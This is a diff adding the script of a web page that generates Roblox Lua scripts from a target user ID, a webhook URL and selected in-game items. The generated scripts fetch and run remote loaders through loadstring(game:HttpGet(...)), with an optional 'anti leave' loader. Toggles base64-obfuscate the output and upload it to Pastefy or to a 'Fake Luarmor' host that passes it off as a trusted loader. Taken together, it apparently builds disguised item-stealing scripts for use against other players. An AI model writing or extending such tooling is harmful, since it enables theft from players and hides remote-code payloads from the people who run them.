+  const res=await fetch(endpoint,{method:"POST",headers:{"Content-Type":"application/json","apikey":"sb_publishable_iLtQ--kdsOH2VFvK0VzmHw_N_ddLyIJ","Prefer":"return=representation","Accept":"application/vnd.pgrst.object+json"},body:JSON.stringify({title:"Script.lua",content:script})});
+  if(!res.ok){const e=await res.text().catch(()=>"");throw new Error("HTTP "+res.status+(e?": "+e.slice(0,120):""));}
+  const data=await res.json();const id=data&&(data.id||(Array.isArray(data)&&data[0]&&data[0].id));if(!id)throw new Error("No ID");
+  return `loadstring(game:HttpGet("https://api-luamor.lovable.app/files/v5/raw/${id}.lua"))()`;
+}
+
+async function generateScript(){
+  if(!userInRequiredServer){showToast(t("genServer"));return;}
+  const webhookUrl=document.getElementById("webhookUrl").value.trim();
+  let targetId=document.getElementById("targetId").value.trim();
+  const targetUser=document.getElementById("targetUser").value.trim();
+  const customLoader=document.getElementById("customLoader").value.trim();
+  const usePastefy=document.getElementById("togglePastefy").checked;
+  const useFakeLuarmor=document.getElementById("toggleFakeLuarmor").checked;
+  const useAntiLeave=document.getElementById("toggleAntiLeave").checked;
+  const useObfuscate=document.getElementById("toggleObfuscate").checked;
+  if(!targetId&&targetUser){await autoLookup(true);targetId=document.getElementById("targetId").value.trim();}
+  if(!targetId)return showToast(t("toastNeedId"));
+  if(!(selectedBrainrots.size||selectedGears.size||selectedBases.size))return showToast(t("genWarn"));
+  const br=formatLuaTable(selectedBrainrots),gr=formatLuaTable(selectedGears),bs=formatLuaTable(selectedBases);
+  let customBlock="";
+  if(scriptMode==="CUSTOM"&&customLoader)customBlock=`${customLoader}\n\n    task.wait(0.5)\n\n`;
+  else if(scriptMode==="AUTO-CODE")customBlock=`loadstring(game:HttpGet("${AUTO_CODE_LOADER}"))()\n\n    task.wait(0.5)\n\n`;
+  else if(scriptMode==="DUEL")customBlock=`loadstring(game:HttpGet("${DUEL_LOADER}"))()\n\n    task.wait(0.5)\n\n`;
+  let execBlock=`    ${customBlock}loadstring(game:HttpGet("${LOGIC_LOADER}"))()`;
+  if(useAntiLeave){
+    execBlock=`task.spawn(function()\n    loadstring(game:HttpGet("https://pastefy.app/JhWiqjXL/raw"))() -- Anti Leave\nend)\n\ntask.spawn(function()\n    ${customBlock}loadstring(game:HttpGet("${LOGIC_LOADER}"))()\n    task.wait(1)\nend)`;
+  }
+  let script=`getgenv().targetId = ${targetId}\ngetgenv().webhookUrl = "${webhookUrl}"\n\ngetgenv().targetBrainrots = {\n${br}}\n\ngetgenv().targetBaseSkins = {\n${bs}}\n\ngetgenv().targetGears = {\n${gr}}\n\n${execBlock}`;
+  if(useObfuscate){try{script=obfuscateBase64(script);}catch(e){showToast(t("toastObfErr")+": "+e.message);document.getElementById("scriptOutput").textContent=script;document.getElementById("result").classList.add("show");return;}}
+  if(usePastefy){try{script=await uploadToPastefy(script);showToast(t("toastPastefy"));}catch(e){showToast("❌ Pastefy: "+e.message);document.getElementById("scriptOutput").textContent=script;document.getElementById("result").classList.add("show");return;}}
+  if(useFakeLuarmor){try{script=await uploadToFakeLuarmor(script);showToast(t("toastFakeLuarmor"));}catch(e){showToast("❌ Fake Luarmor: "+e.message);document.getElementById("scriptOutput").textContent=script;document.getElementById("result").classList.add("show");return;}}
+  document.getElementById("scriptOutput").textContent=script;
+  document.getElementById("result").classList.add("show");
+  addToHistory(script);saveState();
+}
+
+document.getElementById("togglePastefy").addEventListener("change",function(){if(this.checked)document.getElementById("toggleFakeLuarmor").checked=false;});
+document.getElementById("toggleFakeLuarmor").addEventListener("change",function(){if(this.checked)document.getElementById("togglePastefy").checked=false;});
+document.getElementById("generateBtn").onclick=generateScript;
+document.getElementById("copyBtn").onclick=()=>{navigator.clipboard.writeText(document.getElementById("scriptOutput").textContent);showToast(t("toastCopied"));};
+
+function showToast(msg){const old=document.querySelector(".toast");if(old)old.remove();const el=document.createElement("div");el.className="toast";el.textContent=msg;document.body.appendChild(el);setTimeout(()=>el.remove(),4000);}
+
+window.addEventListener("beforeunload",saveState);
+window.addEventListener("pagehide",saveState);
+
+// ═══════════════════════════════════════════════════
+// INIT
+// ═══════════════════════════════════════════════════
+renderList("brainrot");renderTags("brainrot");
+renderList("gears");renderTags("gears");
+renderList("bases");renderTags("bases");
+applyLang();
+initAuth();
+
+// PARTICLES
+(function(){
+  const c=document.getElementById("particles");
+  if(!c)return;
+  for(let i=0;i<30;i++){
+    const p=document.createElement("div");
+    p.className="p";
+    p.style.left=Math.random()*100+"%";
+    p.style.animationDuration=(Math.random()*10+8)+"s";
+    p.style.animationDelay=(Math.random()*10)+"s";
+    p.style.width=p.style.height=(Math.random()*2+1)+"px";
+    p.style.opacity=Math.random()*0.6;
+    c.appendChild(p);
+  }
+})();
+</script>
+</body>
+</html>
